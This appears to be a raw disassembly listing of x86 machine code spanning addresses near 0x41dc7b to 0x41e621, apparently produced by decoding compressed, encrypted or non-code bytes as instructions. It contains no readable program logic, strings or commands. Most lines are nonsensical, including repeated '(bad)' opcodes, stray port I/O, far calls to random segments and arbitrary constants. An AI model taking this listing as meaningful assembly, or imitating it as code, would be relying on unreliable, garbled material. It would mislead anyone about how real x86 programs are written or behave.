  41dc7b:	jmp    DWORD PTR [edi+0x68b0d050]
  41dc81:	fimul  WORD PTR [esi]
  41dc83:	pop    ebx
  41dc84:	cmp    BYTE PTR [ecx+eax*1],0x0
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	jns    0x41dce8
  41dc8e:	call   0xbffc:0x2a76ce85
  41dc95:	xchg   BYTE PTR [edx+0x1e],bl
  41dc98:	adc    ecx,DWORD PTR [edi-0x4a933052]
  41dc9e:	cwde   
  41dc9f:	daa    
  41dca0:	sbb    DWORD PTR [eax],ecx
  41dca2:	xor    ah,BYTE PTR [ebp-0x121da81b]
  41dca8:	and    DWORD PTR [esi+0x15],0x492babe7
  41dcaf:	es into 
  41dcb1:	in     al,0xb7
  41dcb3:	push   0x28
  41dcb5:	lock push eax
  41dcb7:	ror    BYTE PTR [eax-0x17],1
  41dcba:	dec    ebx
  41dcbb:	mov    dl,0x6c
  41dcbe:	stc    
  41dcbf:	dec    edx
  41dcc0:	jmp    0x41dc64
  41dcc2:	lds    esi,FWORD PTR [esi+0x3f]
  41dcc5:	mov    eax,0x9d61e4da
  41dcca:	jo     0x41dca2
  41dccc:	or     ebp,eax
  41dcce:	fild   DWORD PTR [eax-0x7e]
  41dcd1:	clc    
  41dcd2:	fcmovb st,st(3)
  41dcd4:	in     al,0x8b
  41dcd6:	xor    bl,0x10
  41dcd9:	adc    DWORD PTR [ebp+0x2bf4c821],ebp
  41dcdf:	iret   
  41dce0:	adc    cl,BYTE PTR [ecx+0xb5fb1e7]
  41dce6:	mov    ebx,0x91cc898c
  41dceb:	stos   DWORD PTR es:[edi],eax
  41dcec:	outs   dx,DWORD PTR ds:[esi]
  41dced:	cs mov cl,0x79
  41dcf0:	xchg   BYTE PTR [edx+0x2b40b98d],dl
  41dcf6:	sbb    dl,BYTE PTR [esi-0x41]
  41dcf9:	add    BYTE PTR [eax+0x79],al
  41dcfc:	mov    dh,0x3a
  41dcfe:	lods   eax,DWORD PTR ds:[esi]
  41dcff:	mov    ebx,0xee9e8750
  41dd04:	aad    0x34
  41dd06:	dec    esp
  41dd07:	(bad)  
  41dd08:	mov    cl,0x5f
  41dd0a:	shl    DWORD PTR ds:0xff554f07,0x10
  41dd11:	rcr    esi,cl
  41dd13:	mov    sp,0x2886
  41dd17:	inc    edx
  41dd18:	xchg   esp,eax
  41dd19:	outs   dx,DWORD PTR ds:[esi]
  41dd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd1b:	sub    al,0x4d
  41dd1d:	test   DWORD PTR [edi-0x65],0x40b20f5a
  41dd24:	or     eax,0xd89f2112
  41dd29:	stos   DWORD PTR es:[edi],eax
  41dd2a:	push   ebp
  41dd2b:	or     DWORD PTR [edi+edx*1-0x5756a7e6],ebp
  41dd32:	pop    esp
  41dd33:	xor    dh,BYTE PTR ds:0x215fbd4b
  41dd39:	and    DWORD PTR [esi],edx
  41dd3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd3c:	jo     0x41dd08
  41dd3e:	scas   eax,DWORD PTR es:[edi]
  41dd3f:	mov    edx,0xb844061e
  41dd44:	cmp    eax,0xb69e83ea
  41dd49:	dec    esi
  41dd4a:	sbb    al,0xde
  41dd4c:	es aaa 
  41dd4e:	xor    DWORD PTR ds:0xb2acb14a,0x36ad7b03
  41dd58:	sub    edx,esi
  41dd5a:	(bad)
  41dd5d:	ficomp WORD PTR [edi+0x419f98a8]
  41dd63:	or     eax,0x7a2a7013
  41dd68:	pop    ebx
  41dd69:	mov    ah,bl
  41dd6b:	xchg   edi,eax
  41dd6c:	aaa    
  41dd6d:	cmp    edi,edx
  41dd6f:	push   ss
  41dd70:	or     BYTE PTR [ecx+edx*2-0x29],cl
  41dd74:	(bad)  
  41dd76:	add    BYTE PTR [ecx],bh
  41dd78:	jnp    0x41dd66
  41dd7a:	xchg   ecx,eax
  41dd7b:	cmp    al,0x68
  41dd7d:	xor    eax,0x7dd1d2fb
  41dd82:	sbb    dh,BYTE PTR [edx]
  41dd84:	xchg   ebp,eax
  41dd85:	dec    eax
  41dd86:	sub    al,0x4c
  41dd88:	cmp    DWORD PTR [ebp-0x3fc2030f],esp
  41dd8e:	mov    ebx,0x47
	...
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	iret   
  41de01:	mov    ebx,DWORD PTR [edi+0x13d84f4]
  41de07:	add    BYTE PTR [ecx+eax*1],al
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	inc    edi
  41de0d:	xchg   ecx,eax
  41de0e:	in     al,0x20
  41de10:	scas   al,BYTE PTR es:[edi]
  41de11:	outs   dx,BYTE PTR ds:[esi]
  41de12:	adc    al,0x5d
  41de14:	not    BYTE PTR [esi]
  41de16:	push   esp
  41de17:	inc    esi
  41de18:	mov    esp,0x68cdfb42
  41de1d:	push   ebx
  41de1e:	js     0x41dddc
  41de20:	fidiv  WORD PTR [eax-0x3c]
  41de23:	(bad)  
  41de24:	push   0xffffffae
  41de26:	dec    edi
  41de27:	loope  0x41de28
  41de29:	mov    ?,WORD PTR [edi]
  41de2b:	lea    edi,[ecx+0x6c]
  41de2e:	enter  0x3e94,0x94
  41de32:	xchg   esi,edx
  41de34:	jmp    0x41de73
  41de36:	jbe    0x41de08
  41de38:	mov    BYTE PTR [ecx],ah
  41de3a:	jecxz  0x41de2c
  41de3c:	sahf   
  41de3d:	mov    ebp,0xaa5ecb33
  41de42:	loop   0x41dddf
  41de44:	test   BYTE PTR [esi],0xaf
  41de47:	ins    BYTE PTR es:[edi],dx
  41de48:	sub    al,0x69
  41de4a:	jmp    0x41de66
  41de4c:	sub    al,0x1d
  41de4e:	mov    ds:0x999d659d,eax
  41de53:	in     eax,dx
  41de54:	jl     0xdcc85a4e
  41de5a:	std    
  41de5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de5c:	pop    edx
  41de5d:	mov    eax,0x9d980966
  41de62:	jb     0x41de43
  41de64:	cli    
  41de65:	ins    BYTE PTR es:[edi],dx
  41de66:	xor    eax,ebx
  41de68:	scas   eax,DWORD PTR es:[edi]
  41de69:	(bad)  
  41de6a:	mov    bh,dh
  41de6c:	lahf   
  41de6d:	enter  0xea7f,0xd0
  41de71:	and    BYTE PTR [ecx+0x728a8549],dl
  41de77:	loop   0x41deb2
  41de79:	mov    bl,0x41
  41de7b:	inc    ecx
  41de7c:	and    ebp,0xfec247c2
  41de82:	lods   al,BYTE PTR ds:[esi]
  41de83:	sbb    cl,ah
  41de85:	in     eax,dx
  41de86:	out    0x3b,al
  41de88:	mov    ebp,0x9ada0246
  41de8d:	out    0x85,al
  41de8f:	sub    eax,0xf426650d
  41de94:	mov    eax,ds:0xf461ac8d
  41de99:	jp     0x41dec1
  41de9b:	sti    
  41de9c:	into   
  41de9d:	mov    edi,gs
  41de9f:	mov    ecx,0xf6a57478
  41dea4:	mov    DWORD PTR [edx-0x3],esp
  41dea7:	rcr    bl,0x34
  41deaa:	mov    dl,0xcf
  41deac:	jle    0x41de4d
  41deae:	imul   ebx,edx,0xd0dd5b15
  41deb4:	adc    al,0xf3
  41deb6:	jl     0x41de7a
  41deb8:	pop    ds
  41deb9:	dec    eax
  41deba:	fs clc 
  41debc:	imul   esp,ebp,0x6b
  41debf:	out    0x7,al
  41dec1:	clc    
  41dec2:	pop    edi
  41dec3:	cmp    BYTE PTR [edi+0x2e],al
  41dec6:	mul    ecx
  41dec8:	dec    esp
  41dec9:	jbe    0x41deea
  41decb:	mov    al,ds:0xfcd0bc72
  41ded0:	mov    esi,0x4466edb1
  41ded5:	push   ss
  41ded6:	fwait
  41ded7:	mov    ah,0x48
  41ded9:	mov    cl,dh
  41dedb:	push   ss
  41dedc:	inc    ebx
  41dedd:	out    dx,al
  41dede:	push   ebx
  41dedf:	sbb    esi,DWORD PTR [eax+0x20d5bf7d]
  41dee5:	fcmove st,st(4)
  41dee7:	aaa    
  41dee8:	aam    0xd4
  41deea:	pop    edi
  41deeb:	(bad)  
  41deed:	and    ecx,DWORD PTR [eax+0x69be18e]
  41def3:	cwde   
  41def4:	std    
  41def5:	mov    bh,0xd9
  41def7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def9:	push   eax
  41defa:	int    0x55
  41defc:	mov    ah,BYTE PTR [ebx]
  41defe:	cdq    
  41deff:	in     eax,0xb1
  41df01:	(bad)  
  41df03:	mov    al,0x4c
  41df05:	(bad)  
  41df06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df07:	or     esi,DWORD PTR [ebp-0x1bae1579]
  41df0d:	(bad)  
  41df0e:	repnz inc edi
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x60fa9ce9
  41df82:	push   esp
  41df83:	repnz mov BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	add    al,0x7b
  41df8e:	retf   0xf0fa
  41df91:	adc    eax,0x8c9b2c1c
  41df96:	out    0x6e,eax
  41df98:	out    dx,al
  41df99:	push   ebp
  41df9a:	push   cs
  41df9b:	stos   BYTE PTR es:[edi],al
  41df9c:	dec    ecx
  41df9d:	lds    esi,FWORD PTR [ebx]
  41df9f:	mov    eax,0x10b9edbe
  41dfa4:	mov    BYTE PTR [ecx],ah
  41dfa6:	std    
  41dfa7:	cli    
  41dfa8:	retf   0xa336
  41dfab:	add    dl,cl
  41dfad:	aaa    
  41dfae:	mov    edi,0x3a691d6c
  41dfb3:	sub    BYTE PTR [ecx+0x78],ah
  41dfb6:	xchg   esp,eax
  41dfb7:	sbb    bl,BYTE PTR [edx-0x21]
  41dfba:	scas   eax,DWORD PTR es:[edi]
  41dfbb:	fwait
  41dfbc:	push   esi
  41dfbd:	sbb    BYTE PTR [eax],cl
  41dfbf:	popa   
  41dfc0:	dec    ecx
  41dfc1:	rol    BYTE PTR [eax-0x52],cl
  41dfc4:	test   al,0x1d
  41dfc6:	mov    ds:0x4dce2742,eax
  41dfcb:	mov    bh,0xd9
  41dfcd:	pushf  
  41dfce:	ds inc ebx
  41dfd0:	call   0x627c:0x2549d4ef
  41dfd7:	jp     0x41e004
  41dfd9:	and    bl,BYTE PTR [ebp+0x5a]
  41dfdc:	lahf   
  41dfdd:	and    al,0x5f
  41dfdf:	pcmpgtd mm3,QWORD PTR [ecx]
  41dfe2:	out    0xe4,eax
  41dfe4:	jecxz  0x41dfb8
  41dfe6:	ss jnp 0x41dfd9
  41dfe9:	dec    esi
  41dfea:	test   DWORD PTR [edi],0xf113f927
  41dff0:	sub    esp,DWORD PTR [edx-0x3353482e]
  41dff6:	add    al,0x8c
  41dff8:	je     0x41e035
  41dffa:	lods   al,BYTE PTR ds:[esi]
  41dffb:	mov    ds:0xcd11fe0e,al
  41e000:	push   0x2fd05cfe
  41e005:	ror    BYTE PTR [ebx],0x5a
  41e008:	aas    
  41e009:	enter  0x2e73,0xd1
  41e00d:	add    ecx,DWORD PTR [edx+0x21]
  41e010:	pop    esp
  41e011:	(bad)  
  41e012:	push   esp
  41e013:	xor    dl,BYTE PTR [edi-0xd]
  41e016:	pop    ds
  41e017:	xchg   edx,eax
  41e018:	shl    DWORD PTR [edx+0x2b],0x1
  41e01c:	in     al,dx
  41e01d:	sub    esp,DWORD PTR [esp+ebp*4+0x2239333b]
  41e024:	mov    bl,0xca
  41e026:	f2xm1  
  41e028:	fbstp  TBYTE PTR [edi-0x379f2c2c]
  41e02e:	add    edx,DWORD PTR [edx]
  41e030:	pop    eax
  41e031:	ja     0x41e078
  41e033:	cmc    
  41e034:	loop   0x41e006
  41e036:	enter  0xdaec,0x17
  41e03a:	test   DWORD PTR [edx+0x57],edx
  41e03d:	adc    ch,0x49
  41e040:	or     dl,BYTE PTR [edx+0x2fc96ac0]
  41e046:	psubd  mm0,QWORD PTR [ebp+0x534e83d4]
  41e04d:	inc    esp
  41e04e:	jmp    0x73e4:0xdade6843
  41e055:	inc    edx
  41e056:	in     al,dx
  41e057:	mov    eax,ds:0x55595838
  41e05c:	inc    ebp
  41e05d:	retf   0x134e
  41e060:	inc    ecx
  41e061:	lods   al,BYTE PTR ds:[esi]
  41e062:	out    0xa1,al
  41e064:	test   DWORD PTR [ecx+0x55],ebx
  41e067:	mov    WORD PTR [ecx],cs
  41e069:	sbb    DWORD PTR [esi],esp
  41e06b:	jne    0x41e02f
  41e06d:	(bad)  
  41e06e:	loopne 0x41e0a9
  41e070:	mov    cl,0x54
  41e072:	cld    
  41e073:	add    eax,0x48bd2f0a
  41e078:	xchg   edi,eax
  41e079:	push   0x2c
  41e07b:	and    edi,ecx
  41e07d:	fistp  WORD PTR [ebx+0x5a]
  41e080:	cmp    eax,0xc933c876
  41e085:	xchg   edi,eax
  41e086:	into   
  41e087:	out    0xb9,eax
  41e089:	shr    BYTE PTR [esi],1
  41e08b:	xchg   ebp,eax
  41e08c:	sub    BYTE PTR [edx+0xa493],0x0
	...
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	gs push eax
  41e102:	dec    ebx
  41e103:	lock mov WORD PTR [edi],?
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	mov    ecx,0x5c1350b7
  41e111:	pop    eax
  41e112:	bound  esp,QWORD PTR es:[esi+0x2531c8fe]
  41e119:	and    bh,BYTE PTR [edi-0x7f9159cc]
  41e11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e120:	imul   esp,DWORD PTR [esi+0x7c],0x55b126e8
  41e127:	or     DWORD PTR [edx-0x3b92ea0c],edx
  41e12d:	dec    ecx
  41e12e:	cld    
  41e12f:	and    dh,bl
  41e131:	inc    eax
  41e132:	xchg   DWORD PTR [esi],esp
  41e134:	jnp    0x41e0f8
  41e136:	xchg   ebp,eax
  41e137:	(bad)  
  41e138:	jl     0x41e0da
  41e13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e13b:	call   0x801c:0xbc774ae0
  41e142:	pop    edx
  41e143:	jge    0x41e1c3
  41e145:	mov    edi,0x4f54f22d
  41e14a:	xchg   esp,eax
  41e14b:	(bad)  
  41e14c:	(bad)  
  41e14d:	mov    ebp,0xcf74ebc1
  41e152:	in     al,0x51
  41e154:	and    ah,al
  41e156:	popa   
  41e157:	sub    eax,DWORD PTR [edx]
  41e159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e15a:	jp     0x41e1b0
  41e15c:	add    al,0x92
  41e15e:	enter  0x1eca,0xac
  41e162:	push   ebx
  41e163:	inc    esp
  41e164:	nop
  41e165:	out    0x30,al
  41e167:	call   0x9684:0x5c142cc2
  41e16e:	mov    ds:0xe7c3624d,eax
  41e173:	fistp  DWORD PTR [eax-0xb]
  41e176:	push   eax
  41e177:	mov    edx,DWORD PTR [eax]
  41e179:	inc    ebx
  41e17a:	outs   dx,DWORD PTR ds:[esi]
  41e17b:	cmp    DWORD PTR [ecx],edi
  41e17d:	or     BYTE PTR [ecx],al
  41e17f:	dec    ebx
  41e180:	stos   DWORD PTR es:[edi],eax
  41e181:	mov    al,bl
  41e183:	adc    ch,BYTE PTR [esi+esi*1]
  41e186:	sbb    edi,ecx
  41e188:	push   ecx
  41e189:	xchg   esp,eax
  41e18a:	mov    ebp,0xa2fc0fff
  41e18f:	mov    esi,0x7311800c
  41e194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e195:	stos   BYTE PTR es:[edi],al
  41e196:	xchg   esp,eax
  41e197:	out    dx,eax
  41e198:	push   esi
  41e199:	xchg   esi,eax
  41e19a:	xchg   esp,eax
  41e19b:	push   es
  41e19c:	or     cl,BYTE PTR [ebp+0x14e10158]
  41e1a2:	out    dx,al
  41e1a3:	add    edi,DWORD PTR [esi-0x7e8438f7]
  41e1a9:	xchg   BYTE PTR [eax-0x15cb40cf],dl
  41e1af:	mov    ebp,0x34abd06c
  41e1b4:	xor    BYTE PTR [edx-0x1562730c],cl
  41e1ba:	gs in  eax,0x51
  41e1bd:	retf   
  41e1be:	cmovg  edi,ecx
  41e1c1:	sbb    cl,ah
  41e1c3:	adc    eax,0x807abeaf
  41e1c8:	sbb    al,0xd6
  41e1ca:	push   DWORD PTR [edi+0x4283480e]
  41e1d0:	and    al,0x7c
  41e1d2:	outs   dx,BYTE PTR ds:[esi]
  41e1d3:	inc    esi
  41e1d4:	sub    DWORD PTR [ebx-0x53],ebp
  41e1d7:	js     0x41e1b5
  41e1d9:	push   ebp
  41e1da:	mov    ds:0x7fcbb89,al
  41e1df:	jo     0x41e210
  41e1e1:	xchg   edx,eax
  41e1e2:	pop    ss
  41e1e3:	fisubr WORD PTR [edi+0x1b129786]
  41e1e9:	call   edx
  41e1eb:	push   edx
  41e1ec:	jmp    0xd7993b65
  41e1f1:	mov    ah,0x16
  41e1f3:	(bad)  
  41e1f4:	or     al,0xba
  41e1f6:	pop    ss
  41e1f7:	sbb    eax,0x2db79fa7
  41e1fc:	jmp    0xb00647e8
  41e201:	lock xchg ecx,eax
  41e203:	and    BYTE PTR [eax],cl
  41e205:	inc    ecx
  41e206:	xchg   ebp,eax
  41e207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e208:	iret   
  41e209:	enter  0x541e,0xf9
  41e20d:	and    DWORD PTR [eax+ebp*2+0x0],ebp
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x2d
  41e281:	cmp    eax,0x409032f1
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	sbb    al,0xf9
  41e28e:	mov    ebx,0xe5bece0
  41e293:	sar    BYTE PTR [eax+0x0],1
  41e296:	outs   dx,DWORD PTR ds:[esi]
  41e297:	cmp    al,0xfc
  41e299:	jl     0x41e2dc
  41e29b:	pcmpeqd mm5,QWORD PTR [esi+edx*1+0x6e]
  41e2a0:	dec    esp
  41e2a1:	lahf   
  41e2a2:	int3   
  41e2a3:	ds pushf 
  41e2a5:	mov    bh,0xf6
  41e2a7:	mov    WORD PTR [eax+0x22],?
  41e2aa:	imul   edi,DWORD PTR [ebp+edi*4+0x25528c61],0x7267fe44
  41e2b5:	and    eax,0x43985401
  41e2ba:	in     eax,dx
  41e2bb:	sbb    eax,0x34780fe
  41e2c0:	pop    ecx
  41e2c1:	ss dec sp
  41e2c4:	iret   
  41e2c5:	inc    edi
  41e2c6:	sbb    DWORD PTR [ebp-0x77],0xffffff86
  41e2ca:	mov    al,0x7e
  41e2cc:	out    dx,al
  41e2cd:	cmc    
  41e2ce:	dec    eax
  41e2cf:	dec    ebx
  41e2d0:	in     al,dx
  41e2d1:	jl     0x41e27a
  41e2d3:	sbb    eax,0xf4c17a05
  41e2d8:	inc    edi
  41e2d9:	popa   
  41e2da:	cmp    DWORD PTR [eax],edi
  41e2dc:	or     esp,DWORD PTR [ebx]
  41e2de:	popf   
  41e2df:	(bad)  
  41e2e0:	push   edi
  41e2e1:	shr    cl,0x3f
  41e2e4:	mov    edi,0x69a0b45d
  41e2e9:	sub    BYTE PTR [esi+0x71],bl
  41e2ec:	shr    DWORD PTR [ebx+eiz*1-0x6c],1
  41e2f0:	xchg   edx,eax
  41e2f1:	jne    0x41e2e5
  41e2f3:	jae    0x41e32f
  41e2f5:	popf   
  41e2f6:	xchg   edx,eax
  41e2f7:	mov    esp,0xe1961b52
  41e2fc:	jcxz   0x41e298
  41e2ff:	aam    0x5b
  41e301:	aam    0x62
  41e303:	adc    esi,0xffffff90
  41e306:	mov    ch,0xaa
  41e308:	or     BYTE PTR [edi-0x2c],0xac
  41e30c:	pop    ebx
  41e30d:	lods   al,BYTE PTR ds:[esi]
  41e30e:	fdiv   QWORD PTR [edi-0x2d]
  41e311:	inc    eax
  41e312:	ficom  WORD PTR [esi-0x60b116f9]
  41e318:	jl     0x41e34e
  41e31a:	push   esi
  41e31b:	imul   ebx,DWORD PTR [esi-0x4f7f071e],0xf7552aa8
  41e325:	mov    esp,0x74ffdbc4
  41e32a:	xchg   edx,eax
  41e32b:	call   0xcee04c98
  41e330:	mov    esi,0xf1be863c
  41e335:	add    edi,DWORD PTR [ebx+esi*4-0x76]
  41e339:	jle    0x41e309
  41e33b:	inc    esi
  41e33c:	fisub  WORD PTR [esi-0x35]
  41e33f:	inc    esi
  41e340:	mov    eax,0x6489bf48
  41e345:	cmc    
  41e346:	push   es
  41e347:	mov    al,0x3b
  41e349:	xchg   DWORD PTR [edi+0xa72a23b],ebp
  41e34f:	aad    0x9f
  41e351:	or     eax,0x5bcbad15
  41e356:	sar    DWORD PTR ss:[ecx+0x2d],0x4d
  41e35b:	and    cl,BYTE PTR [edi-0x29785fb2]
  41e361:	cmp    ah,dh
  41e363:	adc    al,0xd0
  41e365:	fucom  st(4)
  41e367:	pop    ds
  41e368:	cmc    
  41e369:	popa   
  41e36a:	fstp   DWORD PTR [ecx+0x3e]
  41e36d:	mov    BYTE PTR [ecx+esi*8],dl
  41e370:	fst    DWORD PTR [ecx-0x61]
  41e373:	aam    0x9a
  41e375:	sbb    bl,BYTE PTR [esi-0x39]
  41e378:	shl    BYTE PTR [edi-0x4d0ac735],1
  41e37e:	cmp    BYTE PTR [edx+ebp*4+0x48],al
  41e382:	div    bl
  41e384:	aas    
  41e385:	cli    
  41e386:	adc    BYTE PTR [edi-0x6e],cl
  41e389:	jno    0x41e356
  41e38b:	mov    ebp,0x5860edc8
	...
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x5bc62309
  41e403:	iret   
  41e404:	xchg   esp,eax
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	mov    eax,0xef99d236
  41e411:	aas    
  41e412:	imul   edx,DWORD PTR [ebp+0x2e],0xffffffb4
  41e416:	push   eax
  41e417:	lods   eax,DWORD PTR ds:[esi]
  41e418:	mov    bh,BYTE PTR [edi]
  41e41a:	test   eax,ebp
  41e41c:	sbb    al,BYTE PTR [ecx+0x4072f003]
  41e422:	cmp    BYTE PTR [edi],0x6c
  41e425:	(bad)  
  41e426:	(bad)  
  41e427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e428:	(bad)  
  41e42a:	push   ebx
  41e42b:	les    edi,FWORD PTR [esi+edi*1]
  41e42e:	retf   0xd1fa
  41e431:	and    BYTE PTR [edx+0x52905044],0x18
  41e438:	ins    BYTE PTR es:[edi],dx
  41e439:	xchg   edi,eax
  41e43a:	xor    eax,0x139ac63d
  41e43f:	lods   al,BYTE PTR ds:[esi]
  41e440:	ins    DWORD PTR es:[edi],dx
  41e441:	and    esi,esi
  41e443:	push   eax
  41e444:	mov    WORD PTR [ebx+0x4a77ae3c],ss
  41e44a:	cdq    
  41e44b:	fiadd  WORD PTR [edx+0x53cba99f]
  41e451:	jo     0x41e48f
  41e453:	cs push ebp
  41e455:	leave  
  41e456:	jo     0x41e467
  41e458:	push   eax
  41e459:	jge    0x41e454
  41e45b:	cmp    DWORD PTR cs:[ecx+0x117d6ed7],ebp
  41e462:	or     BYTE PTR [edx-0x14dc732],bh
  41e468:	lea    eax,[eax+ecx*4-0x17f47455]
  41e46f:	pushf  
  41e470:	sbb    eax,esp
  41e472:	scas   al,BYTE PTR es:[edi]
  41e473:	mov    ecx,0x6b1b958b
  41e478:	pop    ss
  41e479:	jge    0x41e478
  41e47b:	lods   eax,DWORD PTR ds:[esi]
  41e47c:	push   0xe4230c39
  41e481:	inc    ebx
  41e482:	aaa    
  41e483:	aam    0x32
  41e485:	ins    BYTE PTR es:[edi],dx
  41e486:	mov    eax,ds:0x3ad8bd41
  41e48b:	in     al,dx
  41e48c:	fist   WORD PTR ds:0xf7d450ad
  41e492:	call   0x6259:0x5ec83321
  41e499:	add    al,BYTE PTR [ebx-0x773c4e5c]
  41e49f:	fs sub al,0xb5
  41e4a2:	adc    BYTE PTR [ecx-0x36],0x65
  41e4a6:	pusha  
  41e4a7:	sub    edi,DWORD PTR [ecx+eax*4]
  41e4aa:	cmp    ecx,edi
  41e4ac:	cmovae edi,DWORD PTR [edi+0x3c]
  41e4b0:	fnstenv ds:0x284d8160
  41e4b6:	jbe    0x41e45c
  41e4b8:	mov    BYTE PTR [ecx-0x2b],0x13
  41e4bc:	pop    esi
  41e4bd:	jb     0x41e4b7
  41e4bf:	dec    esp
  41e4c0:	sub    BYTE PTR [ecx],ah
  41e4c2:	dec    eax
  41e4c3:	ds push 0x58ba4a11
  41e4c9:	dec    ebx
  41e4ca:	cmc    
  41e4cb:	or     bh,ah
  41e4cd:	pop    eax
  41e4ce:	mov    al,ds:0x87cd7532
  41e4d3:	repz xor esp,edi
  41e4d6:	daa    
  41e4d7:	mov    eax,ds:0x506204a7
  41e4dc:	mov    esp,0x83bc191f
  41e4e1:	push   ebp
  41e4e2:	dec    edi
  41e4e3:	int3   
  41e4e4:	sub    ebx,DWORD PTR [edx+0x57e6e468]
  41e4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4eb:	or     ah,BYTE PTR [eax]
  41e4ed:	mov    ah,0x89
  41e4ef:	sub    eax,0xf05fe6ac
  41e4f4:	aaa    
  41e4f5:	jnp    0x41e54a
  41e4f7:	add    BYTE PTR [esi],0x44
  41e4fa:	gs out dx,eax
  41e4fc:	das    
  41e4fd:	inc    eax
  41e4fe:	in     al,dx
  41e4ff:	pusha  
  41e500:	mov    dl,0xaf
  41e502:	adc    DWORD PTR [ecx+0x3a709e68],ebx
  41e508:	sbb    al,bh
  41e50a:	(bad)  
  41e50c:	xchg   ecx,eax
  41e50d:	inc    ebp
  41e50e:	pop    ss
  41e50f:	jge    0x41e511
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e539
  41e581:	cmp    DWORD PTR [esi+0x1429864],0x10400
  41e58b:	add    ah,bl
  41e58d:	dec    eax
  41e58e:	fucomp st(6)
  41e590:	lock popa 
  41e592:	sub    eax,0x43535a35
  41e597:	call   0xfdb3:0x4c74eaa5
  41e59e:	pop    DWORD PTR [eax+0x669cc441]
  41e5a4:	iret   
  41e5a5:	fsub   QWORD PTR [edx+0x7c]
  41e5a8:	pusha  
  41e5a9:	mov    DWORD PTR [edx-0x3b],esi
  41e5ac:	fwait
  41e5ad:	mov    bl,ah
  41e5af:	add    eax,ebp
  41e5b1:	(bad)  
  41e5b2:	(bad)  
  41e5b4:	mov    bl,BYTE PTR [edi]
  41e5b6:	pushf  
  41e5b7:	xchg   ebp,eax
  41e5b8:	pop    ebp
  41e5b9:	cwde   
  41e5ba:	(bad)  
  41e5bb:	daa    
  41e5bc:	(bad)  
  41e5bd:	xlat   BYTE PTR ds:[ebx]
  41e5be:	dec    ebx
  41e5bf:	mov    al,0xd1
  41e5c1:	imul   edx,DWORD PTR [esi],0x11
  41e5c4:	lods   al,BYTE PTR ds:[esi]
  41e5c5:	outs   dx,BYTE PTR ds:[esi]
  41e5c6:	pop    edx
  41e5c7:	(bad)  
  41e5c8:	cli    
  41e5c9:	or     BYTE PTR [ecx],dh
  41e5cb:	cld    
  41e5cc:	call   0xe79f:0xf4985298
  41e5d3:	cmp    eax,0xb36d029
  41e5d8:	adc    edx,ebx
  41e5da:	mov    dl,0x4
  41e5dc:	ja     0x41e5d2
  41e5de:	or     bl,BYTE PTR [edi-0x22]
  41e5e1:	pop    ds
  41e5e2:	test   al,0xf8
  41e5e4:	daa    
  41e5e5:	cwde   
  41e5e6:	hlt    
  41e5e7:	mov    ah,0xfd
  41e5e9:	frstor [esi-0x3ae4e52a]
  41e5ef:	ret    
  41e5f0:	inc    edx
  41e5f1:	xlat   BYTE PTR ds:[ebx]
  41e5f2:	mov    dh,0x34
  41e5f4:	fdiv   DWORD PTR [eax]
  41e5f6:	repz pop ecx
  41e5f8:	fadd   QWORD PTR [edx+0x12d517ae]
  41e5fe:	sub    cl,0x17
  41e601:	mov    edi,0x78d7e313
  41e606:	add    DWORD PTR [edx],ecx
  41e608:	cld    
  41e609:	pop    ecx
  41e60a:	scas   eax,DWORD PTR es:[edi]
  41e60b:	(bad)  
  41e60c:	dec    esi
  41e60d:	icebp  
  41e60e:	sbb    al,0x9e
  41e610:	mov    dl,0xca
  41e612:	inc    edi
  41e613:	scas   eax,DWORD PTR es:[edi]
  41e614:	mov    ebx,0xa87d5b2f
  41e619:	sub    edi,DWORD PTR [ebp-0x4322275d]
  41e61f:	sub    bl,bl
  41e621:	retf   0x4b5b
